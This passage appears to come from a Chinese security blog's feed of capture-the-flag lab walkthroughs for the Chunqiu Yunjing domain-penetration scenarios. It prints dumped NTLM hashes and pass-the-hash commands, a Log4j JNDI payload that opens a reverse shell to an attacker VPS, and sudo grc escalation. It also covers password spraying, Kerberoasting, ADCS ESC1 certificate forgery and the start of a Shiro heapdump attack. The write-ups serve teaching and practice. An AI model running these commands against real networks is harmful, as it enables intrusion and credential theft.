class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6a049c17ae6f214d0ce0bb958be94c7a:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:33cd42e4c654333ef6118bea55f376ba:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:b9df9852037915b5f26114769ace114a:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:b0d89dce8c89f4a43758961e8f782174:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:74d63202f94c220e09056568feafa894:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680084218-92447ba8-9bea-4f89-b3aa-a64b3b6d093e.png"></p><p>接着打pth另一台机器结果没有flag，smb连过去Lumia桌面发现有压缩包（爆破不了），最后发现是dump邮件<a href="https://github.com/Jumbo-WJB/PTH_Exchange">https://github.com/Jumbo-WJB/PTH_Exchange</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680501359-e00f52ee-b331-469b-8c40-3f4827f8bc42.png"></p><p>得到手机号和用户名，爆破一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip &gt;zip.txt</span><br><span class="line">john --wordlist=1.txt zip.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680801506-a8481aab-f692-4523-a7f8-4bb10c733bce.png"></p><p>18763918468</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680788965-984babdd-f9b5-49c4-82ac-dabe6da3a546.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Certify</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/</url>
      
        <content type="html"><![CDATA[<p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.122.181:8983 open</span><br><span class="line">39.98.122.181:22 open</span><br><span class="line">39.98.122.181:80 open</span><br></pre></td></tr></table></figure><h2 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h2><p>8983端口用了log4j</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670564140-6160641a-1b94-44e3-bcbf-9c50ef267877.png"></p><p>dns外带测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.122.181:8983/solr/admin/collections?action=$&#123;jndi:ldap://ew7eu8.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670671441-2db4d3c7-699d-4d73-9297-c0c39b729750.png"></p><p>收到了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670662520-8bea4efb-67ee-4cb9-8454-ac4a47ad2244.png"></p><p>vps起jndiexploit，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPS_IP</span><br></pre></td></tr></table></figure><p>payload，同时监听9383端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/collections?action=$&#123;jndi:ldap://VPS_IP:1389/Basic/ReverseShell/VPS_IP/9383&#125; HTTP/1.1</span><br><span class="line">Host: 39.99.154.173:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671298308-e20746fc-74d9-4d06-8576-18109dde7590.png"></p><p>suid没找到提权，尝试sudo</p><h2 id="grc提权"><a href="#grc提权" class="headerlink" title="grc提权"></a>grc提权</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671335848-763f129d-098e-4c2e-837c-f00c41dd0164.png"></p><p><a href="https://gtfobins.github.io/gtfobins/grc/">https://gtfobins.github.io/gtfobins/grc/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc find / -name flag*</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671450842-14c0b103-fd57-47a9-8b45-19abadee7569.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc cat /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671506621-13eec0b5-e112-4296-b77a-c9647c362248.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>接着搭代理，传fscan扫一下9网段</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671674722-5e2b972a-8f8e-4088-9548-b16c1482b031.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.9.19     is alive</span><br><span class="line">(icmp) Target 172.22.9.47     is alive</span><br><span class="line">(icmp) Target 172.22.9.7      is alive</span><br><span class="line">(icmp) Target 172.22.9.26     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.7 XIAORANG-DC</span><br><span class="line">172.22.9.19 当前被控机器</span><br><span class="line">172.22.9.26 DESKTOP-CBKTVMO</span><br><span class="line">172.22.9.47 fileserver</span><br></pre></td></tr></table></figure><p>题目上标签有smb，猜测是有smb服务，fscan中有一个fileserver，连接试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbclient.py 172.22.9.47</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672576600-e9b0737e-6335-47dd-9590-d4c2221dfc62.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672726406-5463716f-3b77-4302-a73e-90c6d8547bee.png"></p><p>secret下拿到</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672777428-a5a263c5-3d81-432d-adac-b07f765d043a.png"></p><p>接着回根目录用get personnel.db下一下这个数据库，看了一下有个user表里有密码但没用户名</p><p>导入看一下，</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673037884-b3c06977-d178-406f-a872-2a2780c58b7c.png"></p><p>一堆用户名和密码，尝试密码喷洒</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673156532-ac68644c-79e9-4faf-b1c3-e00a888c1791.png"></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br><span class="line">cat result.txt|| grep account</span><br></pre></td></tr></table></figure><p>尝试出来这两个可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangjian:i9XDE02pLVf</span><br><span class="line">liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><h2 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h2><p>前面提示说了spn，尝试找域用户下的spn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673333639-314cee9e-b6c5-4331-9ae4-c651d0cd967f.png"></p><p>保存下来爆破hash</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673421020-68374d3e-22dc-46d4-a8ac-9cb0e648b56d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia:MyPass2@@6</span><br><span class="line">chenchen:@Passw0rd@</span><br></pre></td></tr></table></figure><p>再rdp上去发现没权限访问admin目录下文件，同时发现了172.22.9.13 CA域成员机</p><h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>再回去看题目说ADCS，猜测是拿那台CA通过证书拿域控，先枚举有哪些证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27; -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 13 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:135 &lt;--socket error or timeout!</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:445 &lt;--socket error or timeout!</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class="line">[!] Failed to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:80 &lt;--socket error or timeout!</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Property Principals       : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;XIAORANG.LAB\\Domain Users&#x27; and &#x27;XIAORANG.LAB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line">                                              </span><br></pre></td></tr></table></figure><p>发现ESC1，改一下hosts</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674326163-82e19d96-50b0-4f36-9d87-98a250042742.png"></p><h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><p>申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674366122-ec515c94-3a70-4a97-9166-b2dcad9ab192.png"></p><p>利用administrator.pfx证书获取 TGT 和 NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674465823-6232981d-5b0d-45da-9377-1113b83596c3.png"></p><p>拿到域控hash，打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674635851-3a709ffb-d1b8-4334-b055-6585b32b1317.png"></p><p>再上另一台机器，拿3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Hostpital</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/</url>
      
        <content type="html"><![CDATA[<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>发现网页</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506535224-058b8b94-639d-4e3b-9411-b6ac1b340566.png"></p><p>dirsearch扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.99.138.184:8080/</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506304278-680dd407-b95f-4ad0-9c6f-7f702d2701c8.png"></p><p>发现内存泄漏，dump下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure><p>找到shiro的key</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506431241-6b9a66a0-c9bb-491a-93bd-6a2b54efa2dc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure><p>找shiro框架利用工具</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506596467-5cf0c16c-a23c-464c-a6fb-9a9c11fd8a94.png"></p><p>可以看到低权限</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506691266-06c309f6-7c64-47fc-9249-f3ef31b44644.png"></p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506765818-d9b07ec8-c1fe-4707-b162-68e6bcb817e9.png"></p><p>使用vim提权查看文件，此时必须有交互式shell才能查看，方便利用弹个shell</p><figure class="highlight 